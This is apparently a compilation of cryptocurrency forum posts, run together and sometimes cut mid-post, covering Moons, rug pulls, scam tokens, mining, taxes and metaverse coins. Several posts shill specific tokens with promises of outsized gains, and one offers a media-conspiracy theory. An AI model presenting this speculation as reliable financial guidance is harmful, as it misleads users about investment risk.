I told him "I just ignored you like I told you, I didn't tell you to buy it" and he said "so you had to talk when I was going to buy Shiba but you didn't think to tell me anything when I told you I was buying shibazilla"

He clearly got obsessed with crypto and he's too illiterate to understand anything.

I have no idea how to handle him. He clearly got crazy. I literally told him to not bother me and that I blocked him because he's not my friend, but he doesn't care. He's doesn't understand it. He says I'm kidding and we're all "crypto brothers"

I'm afraid soon I'll end up beating him and then I'll lose my job.

Any advices? Maybe someone had a similar situation?

There are over 7000 coins and tokens in crypto space.

Many would say there are too many, but I think there aren't enough yet to make crypto even better.

Let's say the whole world really decides to use just 1 crypto network, that's billions of people and even more incredible transaction amounts.

How will be the transaction speed then? Probably slow, because the networks clogs.

How will be transaction cost will be? Unaffordable or in a fee-less crypto the network cant handle that much transactions.

And what about decentralization? The rich will own the most coins, less decentralization.

**Now what more coins are good for**:

The more coins, the more competition, the better most coins becomes.

Cross-chains, bridges can connect all coins together. If a network A slowly getting overloaded, there is network B and if network B is clogged, there is still network C/D/E/F/G/H/...

and everyone of it connected with each other resulting in more:

- decentralization

- transaction speed/cost

- security

Just wanna be clear that this is all theoretical but it must be somewhat based on the truth.  

You have been investing in your retirement for years via 401K and/or Roth.  You have also been in the crypto game for a few years and have made all the right decisions.  You have made enough through crypto that your decades of investing for your retirement doesn't compare to what you made on crypto, so basically your 401k is now play money. 

What do you do with your 401k?  Cash it out and reinvest a large portion back into the cryptoverse or would it be more beneficial to purchase mostly stablecoins and basically stake them to earn a higher yield than a savings account.

If I invest $500 into Ethereum and the profit turns out to be $500 which means in total I have $1000 in Ethereum, if I were to sell all of that and send the money to someone else wallet, do I have to pay the tax on the profit? Also let's say I was using Binance.US and I sent it to someone else binance (international) and was left with nothing in my binance after sending the crypto.
Also do you guys have any advice on reducing the tax on Crypto. Much would be appreciated. Also does using P2P on binance eliminate tax?

Throughout my day while trying to break up the monotony that is my work I like to fantasize about the what, why, when, where a certain crypto in my portfolio explodes and makes me rich.

I was going along with my routine when, and Im sure they were on my mind because its distribution day, I sudden went full steam into fantasy land about Moons. 

My vision/fantasy about moons is that one day a year or two from now (this gives me plenty of time to accumulate more) moons are trading on the major exchanges and the price skyrockets. But there Moons so even though there more of a meme coin then anything else there value comes from the history of coming from this prestigious Reddit community (my fantasy remember). 

The price gets so high ( at least five thousand dollars) that theres a funny commercial with a jingle as to why you should buy one for your significant other. It is a play off of Kay jewelers every kiss begins with Kay except it goes every gift begins in space (we are all technically in space so it makes me smile).

And so moons become sort of the new diamond of the future.

Ok so thats my vision/fantasy and I know Im not the only one who gets these. Please share your vision/fantasy for moons and there future direction in your mind.

Hi, i need help from advanced crypto investors or investors with good experience.

First of all I want to know the top 3 most used liquidity lock methods by new cripto projects, i currently know about unicrypt, and mundra lock. 

Second I want to know the best method to check liquidity in new projects aside from unicrypt. I have checked some with bscScan but it I have read it that we cant trust self impose contract locks, the devs can modify the lock whenever they want? If anyone have info how to check the locks it will be greatly appreciated. 

Third, mundra have a 100 dollars premium package, I want to know if anyone have experience with it and if it is worth it to discover new locks for projects and profit good from it. 

My father just died from cancer, my mom lost his job and I loose mine too, currently working as waiter (I have a degree in music composition but I have to help my mom and I sell all my equipment to pay debts. I live in Mexico and my situation is very very bad, I cant see a way out, but I read a lot and I am smart, crypto seems good option to try to move to a better life. 

Any good info and knowledge about selecting the good new projects to invest and dont get rug pulled in the process is all I need, or how to track big movements in cripto. 

God bless you all.

Additional Use Cases for Moons?

I think were all super hopeful that one day moons will quite literally, take us to the moon (it hits a little different on moon distribution day I guess). 

But with the current use cases, do we think we could genuinely see $1/$2? Personally, I think we will need to see a bit more (and I have every confidence in the team behind moons that we will eventually). 

I would be interested to hear what use cases could be added to moons that would see a general rise in adoption?

Soooo.... I am certainly not an expert when it comes to cryptocurrency so my question I am about to ask could be stemming from a misunderstanding on my part. If that is the case, please let me know. Thanks! 

Here in [https://bscscan.com/accounts](https://bscscan.com/accounts). It lists all the BSC wallet addresses and the top accounts according to BNB value. Of course there are a few of them that are contract addresses and others that are personal wallets. My question in particular is does anyone know what this wallet is for: 0x8894E0a0c962CB723c1976a4421c95949bE2D4E3 - Binance: Hot Wallet 6?

The reason why I ask is because I recently just got into buying crypto and of course the first thing I do is buy about 50 garbage tokens(recently released, low cap, VERY high probability of scam). I would throw somewhere between $20-$200 into each coin hoping that they will give me a 1000X. lol... most haven't and I fully expect 95% of them not to. Anyway, I knew about scam tokens on the surface but for 3 or 4 tokens I was not quite prepared... These tokens I would buy some of them, then within a minute or two the tokens(only the ones I bought) were mysteriously transferred out of my wallet. With my limited experience I don't believe they were "locked" tokens. I think when a token is locked(ex. squid game token) the coins stay in your wallet. So I pulled up the transaction hash id and started following transfer transactions through about 10-20 wallets ending up at the wallet "Binance: Hot Wallet 6." So my question is what is the Hot Wallet 6? Is it a wallet that the Binance Smart Chain uses to automatically move assets around? Is it a personal Wallet? If it is a personal wallet then someone has set up one of the largest crypto scams ever. Hot Wallet 6 is currently valued at $5.5billion. All of the labeled Hot Wallets have millions of $. If Hot Wallet 6 is a wallet that is used as part of the Binance Smart Chain then the Binance Smart chain has set up one of the largest crypto scams ever. I think I would prefer the wallet to be a personal wallet. If Binance Smart Chain owned it then once the public finds out then BNB/BSC will probably take a huge hit as well as all tokens that use the same chains.

For anyone wanting to following the transfers themselves here is the info:

My Wallet:  0x543a16271d7B17769D564862d4aa2111239EFF74 (If crypto tokens were to "magically" find themselves into my wallet, I wouldn't complain, lol)

First bought token "Shiba Spacex" Transaction hash id:  0x73c84514c0ac466517d383370d941b77a5ec533aea6ddc2ddb0fd15965d03a66

"Shiba Spacex" being transferred out of my wallet without permission Transaction hash id: 0xb266cd5c390124abe9ad0f06eb28f9edfab3cbcff1e31e5837521b699d52538f

Follow transfers OUT until you reach HOT Wallet 6 or another Hot Wallet.

I saw a lot of projects in this year which had generate a lot of traffic on really small price level before launch. What I'm wondering is, how I could find such projects? It not only to make fast money but also to participate and support. 

Last projects which i saw was Safemoon, Safemars, Eclipes, Evergrow, Shiba Inu, Flocki, etc. 

Who can help me with information to understand how I get those information beforehand.

4. USDT
5. BCH

December 31, 2020
1. BTC
2. ETH
3. USDT
4. XRP
5. DOT

I think BTC and ETH will remain #1 #2 for obvious reasons. SOL might take the #3 while DOT could climb to #4 with #5 belonging to ADA.

What are your predictions? I might come back on 31 December 2021 and see someone has nailed down the exact top 5.

Hello Friends,

This is [James Agenda](https://www.holdpolkadot.com/james-agenda).

Tomorrow is a very important day!

# Contributions to Crowdloans on Polkadot's Parachain Auctions will finally start.

Something like Uniswap but with all major chains incl BTC, BNB, ETH, ADA, Polygon...with negligible fees.

If not, why it doesn't exist yet?

I found one of these in my wallet a whole back and have no idea what it is. It's not an NFT right??? What is this? A scam?? How am I going to get scammed if I don't even know what the scammer wants me to do??

I just went through my wallet on the scanners and checked out missed airdrops and scamdrops and found it. It had been there a while but i never figured it out. Anyone out there know?

What are people using for transferring money in from their bank account to buy crypto. So I live in Canada and did all of my FIAT transferring into Bitcoin back when all the online exchanges actually allowed you to connect your bank account and/or your credit card to your exchange account.  After they stopped allowing this to happen I stopped investing in crypto.  I still traded internally but i just stopped funding my account.

About a year ago I decided it was time to look into some funding options because I wanted to start acquiring more crypto. I eventually settled on one particular Canadian exchange that seemed to work.fine.  They had a very user friendly interface and their transaction fees were not unreasonable.  I really had no desire to hold anything in their wallets. I just used them to transfer money in. Id buy something that had a fairly reasonable fee for withdrawals and then shoot it off to an external wallet where I would do all my investing.  But lately they have become very glitchy.  My transfers are getting hung up Pending 2fa and many times Ive had to contact customer support to get them to cancel the transfer and try again.  It is quite frankly getting quite annoying and I'm worried that at some point I'm going to lose a transfer into the Internet void.

&amp;#x200B;

I know if I need to I can use one of the thousand Bitcoin ATM's that seem to be popping up all over the place.  I really don't want to do that since the transaction fees seem on the side of being usury.  So what is out there right now that is reliable, safe, and relatively inexpensive with regards to cost.  Keeping in mind of course that I live in Canada and do all my banking through Canadian Banks.

Cheers

I use TD Ameritrade for conventional stocks and the Thinkorswim app is top-notch IMO with price alerts. However, the apps I use to buy crypto seem to SUUUUCKKKK if they have notifications. What do you guys use? Doesnt need to have a purchase option. I just want the best for staying on top of price changes. 

I have an iPhone if that helps!

My YouTube Account is displaying financial service and crypto ads. My whatever webpage that displays ads is displaying financial service and crypto ads. Even the social media that I rarely use is displaying financial service and crypto ads. 

My TV control has a microphone and whenever I talk to my flatmate in my flat about some topic and it can somehow be categorized, it will lead to the displaying of financial service and crypto ads. My smartphone was used to connect to our living room TVs YouTube, so whenever I go outside and talk to a friend about something that can somehow be categorized... You know what will happen.

Does anyone experience something similar? I will soon destroy my smartphone microphone and plug an external in for phone calls.

As we all know hindsight is 20/20. Probably even more so when it comes to the crypto space.


So what is your hindsight is 20/20 moment when it comes to the crypto world?

My latest one is probably metaverse related. Looking back on it, of course it was going to blow up it was just a matter of time.

My biggest hindsight is me shrugging off people mentioning bitcoin years ago, and thinking the use of it on dnm's was interesting.

Uh oh we hit a snag 

This one phrase is very nostalgic for a lot of the veteran members of this sub. I still remember my first moon distribution date. Waiting anxiously for the time moons would be available to claim. Then frantically going to claim them along with all other members of this sub and overloading the sever, and getting the uh oh we hit a snag. And constantly refreshing for hours till it I finally got my precious moons.

Im not quite sure why but it seems from the past couple distributions moons have been auto deposited into our vaults and it kinda takes the excitement from the distribution day in my opinion.

Newcomers will never know the excitement  and frustration of claiming your moons manually on moon distribution day! 
Anybody else miss this?

I know, I know, selling is against the rules of this sub. But this is truly the best thing that you can do for your portfolio.

**Every. Single. Bull run** has ended with a catastrophic -90% bear market. I dont think this one is going to be any different. 

I predict that this bull run will really start heating up soon. We will see a 120k BTC and a 10k ETH minimum. Then things will enter the mania phase. Shitcoins with literally no purpose will start pumping thousands of percents all day long.

Then, the inevitable crash will come. Your best option is to get out before this happens, no matter what the majority of this sub tell you. This sub has historically given horrible advice.

Make a plan people. Get all your ducks in a row because the bull market is about to heat up and you dont want to be left holding a bag for 3 years.

It's great and all to see some profits, but it's like my brain turns into Jojo the idiot circus boy with a pretty new pet...I pet it, and I massage it. Do I sell, do I hold? Maybe just sell a little? Or should I add more? So many questions and compulsive chart checking, and that's when I blow it...

Now losing, that's just way easier. That's my modus operandi. Buy high and sit back and watch the cratering commence. Much easier to lament a real loss, than see those gains disappear before your very eyes and dream about what could have been...

Squid Game Coin Has Surged Again. This time it's over +200% just days after it plummeted to -99.99%. It is currently trading at $0.01362. A guy even lost his life saving worth 28k grand. WTF do people even see what they are investing in or do they just throw money at anything. Please do basic research on any new project you are investing in and don't throw your life savings on any crypto project. 

Don't Stay Hungry and Don't Stay Foolish.

There's another "beloved" token that suffered the same fate: it was still traded/pumped after the exit scam (or, in this case, the 'final dump'). It was **Bitconnect**.

&amp;#x200B;

https://preview.redd.it/n39y3stfzfx71.png?width=943&amp;format=png&amp;auto=webp&amp;s=04650a172d2e26b74a1f4d3ee77b0185bfcff4cc

&amp;#x200B;

* [Bitconnect originally crashed over 90% from January 5th 2018 to January 15th 2018.](https://coinmarketcap.com/currencies/bitconnect/)
* [Bitconnect 'shut down lending operations' in January 16th 2018.](https://gizmodo.com/bitconnect-anonymously-run-crypto-exchange-crashes-af-1822144652)
* The Bitconnect token price pumped 50% from January 16th to January 17th, and only reached the price of the initial crash again a few days later on January 19th.  
* Even though all this happened, **the token was still listed in a few markets/exchanges** and **people were still trading**. I remember reading a few comments in reddit about people **buying because it's a price of history** (and, indeed, it is/was. I'm sure if the tokens were converted/minted into NFT's that shit would pump like crazy even today. People love their fucking memes and *hey hey heeeeeeeeeeeeeey* is a great one).
* People traded the Bitconnect token until [\- August 2018 when it was finally delisted from the final exchange](https://thenextweb.com/news/bitconnect-final-delisting-exchange)
* Conclusions: Lot of people just want a part of history, granted a few cultists might still belive Carlos Matos (*hey hey heeeeey guy)* will revive Bitconnect ^((even though he was also a victim)).

^(PS: If you have a few BCC tokens find a way to make them into NFT's and don't forget to tip me a few thousands when you make money on it lol)

Sorry for the English, but its not my first language, also I just wanted to write about this as I can't find any discussion about it -

Multiple big name media organisations coordinating the writing of articles about this shitcoin. Saying it's pumping 10,000%, comparing it and predicting it'll be the new Shibu Inu, even going into detail about how the squid game token works and where to buy it. 
It seemed like paid marketing,  but I'm sure a shitcoin couldn't afford the BBC to shill for it. It also made me angry as it was explained in the same article you couldnt sell it, so massive obvious red flag for a rug pull, yet why did they write these articles and risk their readers being scammed? so what motive did all the media corps have for writing it? Does anyone feel the same?

Few days later I feel I was answered - Squid game was rugged and the media corps enacted part 2 of their master plan... articles about squid game crashing to 0, all crypto is a scam.. etc.

Did the media corps have a stake in squid game? Unlikely as a split of $2.1mil is nothing to them. 

Did the media corps want to scare folk away from crypto? - Bring them in with 10,000% gains on a popular coin the average non-crypro user would be familiar with? And them burn them with the rug pull? Possibly, bigger motives of population control at work.

Did they write them to make money on clicks? Possibly, squid game popular, so many folk would read it. But how did all the media corps release articles at the same time? Seems coordinated.

My instinct is that its well coordinated fud by the big man, someone wanted to scare off a large crowd from using crypto and scare away those who already are using it. 

Im interested in knowing if anyone else feels the same or has different take on the whole show?

I wanted to start investing in metaverse/ play to earn/ gaming cryptos/ nfts broadly.

  I was thinking gaming, metaverse etc companies.  Anyone have suggestions for investing into these as alarge whole  For instance could i buy into a big NFT/gaming/metaverse company like Animoca Brands? Anyone know how to invest in Animoca Brands? Like do they sell stock or can you long it on a place like FTX or Mirror protocols? 

Also on other crypto gaming large protocols like Big Time etc I don't see where to invest?  Are there ways to get into these?

&amp;#x200B;

I know you can buy Index Coops MVI multiverse Index fund which buys like (decentraland, sandbox, axie, illuvium and 15 other gaming /nft/ metavers cryptos)  but what are other ways to do so?

Hi All,

Newbie to Reddit and Crypto here so go easy on me.

I have some MTV that I purchased on Kucoin that I now want to pull into my Metamask wallet with the aim of staking it.  I have ETH in my Metamask wallet but the fees to transfer MTV from Kucoin using ETH is way too much so I want to use Binance.

i have added Binance to my Metamask wallet (i dont actually hold any binance).  Is it simply just a case of transferring from Kucoin now and using the Binance smart chain function on the Kucoin site?

I'm always worried that i will lose my crypto when i transfer things into my wallet.  Any help and advice in easy to use language would be super helpful.  Thanks All!

I'm looking into mining crypto with a bunch of friends, and analyzing feasibility. For now, it looks like Ethereum could be the most lucrative. On the other hand, there are news that this will significantly change come December, so we can't really rely on Ethereum. But we were looking into the NVIDIA GeForce RTX 3080, and I don't see any information on how much Bitcoin it could mine. Whattomine doesn't even mention BTC in the list of most lucrative cryptos to mine with it. It's Ethereum and then a bunch of altcoins. I'd like to get an answer and sense from you experienced folks. How much bitcoin can it mine now? Is the risk worth it? With your mining experience, how long do these kinds of processors stay efficient and are they likely to go obsolete or near obsolete within the first 2 years? Can whattomine be basis of analysis or is the margin of error huge in real time? Any feedback, for or against the concept is appreciated. Thank you.

Hello all, just for context Im very new to crypto and not incredibly computer savvy. 

Ive ran into a problem of having Binance tokens in a Trust wallet, and what I would like to do is use sushi swap to get abracadabra. Ive downloaded a Metamask wallet as well, but I cant seem to get my Binance chain tokens converted to the Ethereum chain.

Imagine you could invest in Ethereum or Solana when they were only 50$. This is Zenon Network, a layer1 protocol that has grown 550% in the last month and it's still under-valued. 

Network of Momentum is a fast, feeless, and censorship-resistant network designed to overcome the limitations of the current blockchain or DAG-based cryptocurrencies through its unique and superior Layer1 dual coin architecture.

For those interested in crypto who really want to get in on the ground floor of something special. Look into the coin Ryoshis Vision (not to be mistaken for Ryoshi Token which is completely unrelated). Built in 1% burn on every buy, trade, and sell which is driving the price way up. In a month I've multiplied my gains by 10x. Its backed by the devs of the SHIB team as its a coin they early on started giving out as a reward to XSHIB holders and brought on to help further the SHIB ecosystem. I'm no financial adviser, but if you missed out on early day Doge or Shib, this is your chance to get on the ground floor and watch your fortune grow. Its still extremely early in the coins life cycle and its growing rapidly, this is arguably one of the last chances a smaller investor has to get in with a low buy in price and get billions of coins on a project with an extremely high chance of hitting 0.01 at some point in time due to the 1% burn mechanism. There are also a lot of plans for utility with the coin based mostly around the music industry, i would strongly advise anyone to go check out their white paper and consider jumping into this coin.

Bitcoin is looking strong and Ethereum is hitting New ATH's day after day. Polkadot (soon on Top 3) is over $54 and Terra LUNA has almost hit $50.

I feel that adoption is coming faster than we think and that is going to be vital for this Run. Dont forget to DCA out in the process.

We are going to witness the Mother of all Bull Runs.

PS: Note that Vet is officially out of this Bull Run. Vet has been labeled as stable coin since May.

What is the next coin that is going to hit a New ATH?

Happiness hit her like a mouse that is trapped  
Coming towards her stuck still no turning back  
She hid around corners and she hid under beds  
She scared it with hisses and from it she fled  
With every treat she ate when it clink  
And washed it away under the kitchen sink

The doge days are over  
The doge days are done  
The cats are coming  
So you better run

Run fast for your mother, run fast for your father  
Run for your kittens, for your sisters and brothers  
Leave all your toys, and your scratch posts behind  
You can't carry it with you if you want to survive

The doge days are over  
The doge days are done  
Can you hear the cats?

Hi everybody, I am looking for some advice here. I'm planning to visit my parents after almost 4 years of not seeing them and them meeting my son for the first time. 

All great but here is where I need some advice.  We all know the Crypto world is a high volitile world that will chew you up in a matter minutes. ( i know nor btc or eth will not dip so fast) but I will have to take a 10 hour flight. No internet no access to any connectivity at all. 

I own BTC, ETH and ADA those are on a ledge and will stay there, but I own other alts on an exchange together with some BTC and ETH as my "trade" experiment. 

Have any of you taken a similar long flight while having CryptoCurrency on an exchange? I'm not afraid security wise but more for example if the market dips let say 10+% I might loose a good amount of money.  I want to keep my Crypto there so when I have internet I can resume my trading.

What precautions do I take, do I keep everything like it is now or do I convert the alts to for example a stable coin like usdc and hope the alts don't moon? I'm very nervous about this and I could use some guidance. Not going is not an option as my parents are getting older and they need to meet their grandson. 

It's my time to repay my parents for all they have done for me and this trip is very important for me.

Thank you all in advance!

"Meta universe" originated from the science fiction novel "Snow Crash" published in 1992, and was subsequently regarded by the major technology giants as the future technology network trend. Facebook has recently changed its name to "Meta" to focus on this field, and giants such as Nvidia and Microsoft are not to be outdone.

&amp;#x200B;

Against this background, the concept of "meta universe" has been in the ascendant recently. The stock prices of individual stocks related to this concept in the global stock market have "rushed to the sky", and in the field of virtual currency, it has ushered in a carnival.

&amp;#x200B;

A virtual currency related to the concept of "Meta Universe" has recently been fired four times higher, which is quite a shadow of the previous "squid game" in the market-it is "Mana".

&amp;#x200B;

According to the market data of [Investing.com](https://Investing.com), although its price hit an all-time high of US$4.16 last Saturday (October 30), the current price of the coin has fallen back to US$2.8375 per coin, down 9.93% in 24 hours, fluctuating. Very high sex.

Mana was launched in 2017 and is the largest multiplayer role-playing "meta universe" game "Decentraland" to date. Players can use Mana coins to buy and sell assets in the game, and "Decentraland" is considered the pioneer of "meta universe" One, because this game closely integrates blockchain, VR, and the concept of Second Life.

&amp;#x200B;

In 2017, when Mana was first publicly issued, about 24 million U.S. dollars in ETH was raised within 35 seconds, at a price of 0.024 U.S. dollars each.

&amp;#x200B;

Some analysts believe that Mana's rise at least shows that some investors in the market have cast a vote of confidence in "Meta Universe." Moreover, many people who have never heard of "meta universe" are now discussing this concept.

&amp;#x200B;

At the same time, other blockchain-based cryptocurrencies, such as TLM, SAND, and WILD for the three games of Axie Infinity, The Sandbox and Wildder Worlds, are also popular. Moreover, industry sources say that market investors are still looking for smaller related cryptocurrencies.

&amp;#x200B;

It is also worth noting that many tokens are based on Ethereum or its side chains, so the price of Ethereum has also gained a lot of momentum recently. According to the market data of [Investing.com](https://Investing.com), ETH/USD is currently trading at US$4611.91, a record high.

&amp;#x200B;

On the other hand, Goldman Sachs also stated earlier this week that ether is particularly closely related to inflation, and tokens are pro-cyclical products, which means that if the economy performs well, tokens tend to rise. Goldman Sachs analyst Bernhard Rzymelka pointed out that if the Ethereum network's cryptocurrency Ether continues to track inflation expectations, it is likely to jump 80% to $8,000 in the next two months.

&amp;#x200B;

At the same time, investors still need to pay close attention to the high volatility of the virtual currency market. Volatility means risk. This market is still very risky and is not suitable for inclusion in a conventional financial investment portfolio.

Being somewhat new to the whole crypto scene, how have you all found it best (if at all) to convey the groundbreaking potential that the blockchain technology has for our societies across the world?  


Whenever cryptocurrency based discussion comes up IRL it is really interesting to notice that it is mostly younger people who are willing to listen to it, and sometimes it just gets maligned and shut down right away which is frustrating by older individuals. Just trying to figure out how to navigate the whole topic, any discussion or helpful tips would be greatly appreciated :)

Not sure if this has happened to anyone before but Ive gone and jumped right into Banano. I have no idea what or why but when I heard about a coin built on bananas I had to do it. 

Whats the future of Banano? Will there be a banana crisis or will there be an abundance to feed the world? 

Curious if there are other Banano holders out there and where this project will go 

Banano is a feeless, instant, rich in potassium cryptocurrency powered by DAG technology disrupting the meme economy.

Some say its the future and its edible! 

Would love to learn more about what others think about this coin!

Surface level: mindless speculation, looks fun, download app, buy 20 $. 

Solid grounding: over two dozen hours of lectures/articles/podcasts, resists talking about it 

Dug deep: has mined, thinks in cycles not in weeks, fiat hatred grows academically, various handles

Bunkered: 125% in, ramen costs 300 Satoshis, borrows against themself, anon

 Happiness hit her like a mouse that is trapped  
Coming towards her stuck still no turning back  
She hid around corners and she hid under beds  
She scared it with hisses and from it she fled  
With every treat she ate when it clink  
And washed it away under the kitchen sink

The dog days are over  
The dog days are done  
The cats are coming  
So you better run

Run fast for your mother, run fast for your father  
Run for your kittens, for your sisters and brothers  
Leave all your toys, and your scratch posts behind  
You can't carry it with you if you want to survive

The dog days are over  
The dog days are done  
Can you hear the cats?  
'Cause here they come

Bernhard Rzymelka, managing director of Goldman Sachs Global Markets, pointed out that cryptocurrency assets have been closely tracking inflation in the past few years.

&amp;#x200B;

By comparing the Bloomberg Galaxy Cryptocurrency Index and market-based inflation expectations indicators, Bernhard Rzymelka found that there is a strong correlation between the two.

&amp;#x200B;

He said that Ethereum has a particularly close relationship with inflation. He added that this cryptocurrency is procyclical, and when the economy performs better, it tends to rise.

&amp;#x200B;

According to the picture given by Bernhard Rzymelka, it can be seen that by the end of this year, Ethereum may soar to $8,000, which is an 80% increase from the historical high of $4,600 set on Tuesday.

&amp;#x200B;

As of writing, Ethereum rose by 6.45% to 4,583.99 US dollars within the day. Previously, this cryptocurrency once exceeded 4,600 US dollars, setting a new all-time high.

Yeah, I said it it. Top 10 market cap coin and I'm saying it's incredibly undervalued. It's true through, so many people seem to be sleeping on it. I'm not even going to get into all the fundamentals of the tech because none of you care anyway. The main point is that Solana is *the* answer to Bitcoin and Ethereum power consumption. Do I care about BTC power consumption? Nope. Does the average noob who reads CNN.com care about it? **Yes.** 

Don't take financial advice from me, but we're moments away from some huge mainstream FOMO and there's going to be an insane influx of people buying this because they think it's a "Bitcoin killer". Big things on the horizon.

 Change often pushes people to abandon stereotypes and inspire new thinking, and the rise of blockchain will upend the way people think about things in many industries.

However, when it comes to exponential growth, we tend to overestimate the short-term impact and underestimate the long-term impact. Just as the dotcom bubble collapsed in 2000, the Internet went from being a game changer to being a hotbed of capital. It turns out that the Internet is not so magical, and most companies have not succeeded in building a worthwhile business model on the Internet. However, how many people can imagine that only a dozen years later, the Internet has profoundly changed the pattern of today's business society, but also changed our lives.

Like the development of the Internet, the rise of blockchain, a protocol-based, disruptive technology that requires large-scale collaboration and participation, will take longer than most people expect, and the ultimate scope and depth of impact will be far greater than most people imagine. The future development of blockchain will not be plain sailing. It may experience overheating or even bubble stage, and may also experience trough. However, I believe that blockchain, as the core technology of the next stage of the digital wave, will eventually build a diversified ecological value Internet, which will profoundly change the structure of the future business society and our lives

First, let's talk about currency speculation. Frankly speaking, it is a way to buy from the secondary market at a low price and then sell the currency to make profits when the price rises. Coin speculation is a high-risk, high-return investment. Because the current currency price is high, investment speculation requires a lot of capital investment, the threshold is too high. Ordinary investors do not have the financial capacity to play the risk - averse game. And must always pay attention to policy guidance, pay close attention to market trends, afraid of missing a sickle and afraid of cutting leeks. The market is not very stable now, the pricing power is always in the hands of the dealer. You do not know when to go up, when to fall, accidentally cut leek. No one can buy at the lowest point and sell at the highest point. What we can do is gradually improve our level and outperform most people.

Coinbase account defi liquidity mining is equivalent to quantitative investment, an investment, long-term returns, and produce a certain amount of money every day, and revenue stream, because the mining and energy storage investment characteristics, not every day to sell the COINS, but mainly the chariot COINS, so don't stare, every day on real-time currency, the normal life and work, Make money easy and fun. What's more, when the price of coins goes up and you have another batch of coins, you have enough chips to trade. Mining is a continuous discounted investment behavior, can obtain lower cost chips. When the currency rises to a certain price, there is no need to worry about short selling. Basically, by participating in mining, you can eat a big chunk of the entire market. It is a relatively stable investment way

1, low cost of mining VS high cost of speculation

2, mining risk is small VS speculation risk is large

3, mining sustainable income VS speculation is not sustainable

4, mining profits VS speculation every day to earn and lose

5. Mining has strong risk resistance VS speculation has no risk resistance

Call me crazy but crypto seems to have lost its way (save for say bitcoin and ethereum). To that end Gitcoin seems like a dark horse. 

Circulating supply less than 15 mil, market cap under 130 mil, huge community and even supported by vitalik. 

With all the current scurrying around hype chasing in this bullrun for the next meme or metaverse project or whatever the next 'it thing' is, gitcoin should surely be on everyone's radar. Instead of positioning itself to be the next best project as every other coin is trying to do, it's positioning itself to be 'the source' for the creation of the next best thing(s) i.e. a platform with quadratic funding to fund open source projects and reward developers for their efforts (whether it be metaverse projects in Web 3.0, nft projects, defi) etc. 

Seems a lot of people have spent too long getting hung up on crypto cliches like 'transactions per second', 'privacy' 'scaling' and other buzz words that are being thrown around with the latest 'it' crypto and we just keep going around in circles.

In a world where crypto is mainstream which appears to be happening at a rapid pace, it seems as though gitcoin or something like it is fundamental to the crypto space as you have an entire generation of people looking to make money for open source development. 

Thoughts?

Bit of a noob question. So I just invested into a coin thats on both eth DEX's and pancake swap (bsc). I got it on pancake swap because I simply do not have the liquidity to justify paying eth gas fees. However, I noticed that the prices of the token dont exactly follow each other between the chains, is this normal? Also, in the case that the coin gets added to a CEX, will I be able to deposit the token on that cex even tho its currently on my metamasks BSC network? Some context, the coin has most of its volume on the ETH CEXs. Only about 20% of the volume is on pancakeswap, rest is on uniswap etc different eth cexs

I know the game's pretty popular, but I just noticed the God's Unchained ($GODS) token is available on CoinEx.

I've been playing playing the game for a few months now, and knew the token was in pre-sale, but just saw it at market on CoinEX.

Price: $6.77

Circulating supply- 23,660,714

Max Supply- 500,000,000

Market Cap- 160M

24h Volume- 17M

I think it either hit market today or yesterday.

If you don't know what God's Unchained is, it's a TCG (Hearthstone/MTG) where you own your cards as NFTs, and is on the F2P/play to earn model. Giveaways are decent. Trade cards on Immutable X marketplace

So far so good from me, check it out if you're interested: https://godsunchained.com

I'm not sure if this has been asked, but is there set times on the distribution times on a particular date or are moons just allocated that distribution day at a random time? Not that it matters, but this has had a positive psychological boost to my daily routine. I'm currently working from home so things can get quite monotonous.

 But the fact that we have this day where we have like a mini party on this sub whenever it's distribution day is just that spice that changes things up a bit. I've noticed it's a lot more positive on distribution day normally as well. I guess what is everyone's moon plans? Hodl, or does distribution day make you also look forward to a little something different? 

As a final note, I've noticed when I grind hard it becomes almost like a sour taste in your mouth then you don't wanna participate for a good week. Pace yourself and enjoy, over time you will collect lots anyway, there's still millions of them to be distributed, just thought I'd share that part too.

So I've been digging into some crypto gaming projects and figured I'd highlight two of the worst that I've found so far. Surprisingly both of these seem quite popular among investors despite the fact there is no game. It makes me wonder, are most crypto investors not big into gaming? These projects come with big promises but anyone who's been gaming within the past five years knows most of these startup kick starter type projects fall flat on their faces and that's if they even make it as far as early access.

So first we'll look at **Project Quantum**.

What is project quantum (or to be more clear what does it promise to one day be)?

* "AAA" FPS title made by "AAA" devs who supposedly worked on a Halo game and Crackdown 3.
* NFT marketplace
* tHe FutuRE Of GamING!
* "Our model allows gamers to enjoy the high stakes competitive action of a AAA first person shooter, while simultaneously earning real-world currency. "

Major issues with this project:

* First and foremost there is no game. No early access, no gameplay footage available, absolutely nothing to indicate its currently being developed. This is the biggest and most major issue. No serious dev is going to to promote a game without at least a conceptual demo they can showcase. If you cant even produce 10 seconds of game footage for a trailer than you are at least 6 years behind actually developing a AAA title.
* Extremely sketchy team. Not only do we have Magnus Stone and Jamie Magnus Stone (Magnus Stone is an object from The Elder Scrolls) but we have claims here that other members have worked on Halo and Crackdown titles. However extensive searching for this leaves you with nothing. Jamie has worked on Dr. Who and directed a couple movies but there is nothing to be found indicating these people were on any sort of dev team. Perhaps they were testers? Yeah bad sign.
* Supposedly this will be a AAA title but we have a nine person team here with only one person who's listed as some sort of programing developer. The rest are chief executives, marketing directors, art designers, and financial directors. Compare this to a AAA company and you will realize this is bullshit. Bungie for instance has 600 employees. Yet were supposed to believe this 9 person team with one programmer will give us the next Halo? 

Next up we have **Star Atlas.**

So what is Star Atlas or again better said is what does Star Atlas promise to be?

* A galactic grand strategy game where players can earn and sell tokens and NFT collectable items that are also usable in game.
* AAA title competing with games like EVE Online and Elite Dangerous. Open world "endlessly explorable" blah blah blah.
* tHe FutuRE Of GamING!

Major issues with this project:

* I think the biggest issue with this one is how hard it pushes you to play immediately upon visiting the web page. You will quickly notice after depositing some SOL and attempting to make a character that there is no game. No game at all! Play now is plastered all over the site but you cant actually play anything. You gain access to the NFT marketplace and apparently thats a game? Thoroughly confused as to what these devs are thinking.
* Now this project does have a much bigger and more feasible team size than Project Quantum, however our major issue remains, absolutely no gameplay footage can be found. You have a really flashy trailer and every crypto youtuber in the universe is posting about this while looping clips from this trailer, instructions on how to get started, how to make money, etc. However youll notice these videos arent like other youtube gaming videos as there is no game. They are showing you how to use the NFT marketplace under the guise of it being gameplay. However there is no gameplay and there is no game.
* Despite the team size being larger than Project Quantum's whopping single programming dev we have a 12 person "engineering" team here. However if we look at a similar project, Elite Dangerous, you are looking at a company with 680 employees around 200 of which are programmers working on ED. Making a AAA MMO is incredibly hard, and virtually impossible from such a small team as its never been done before.

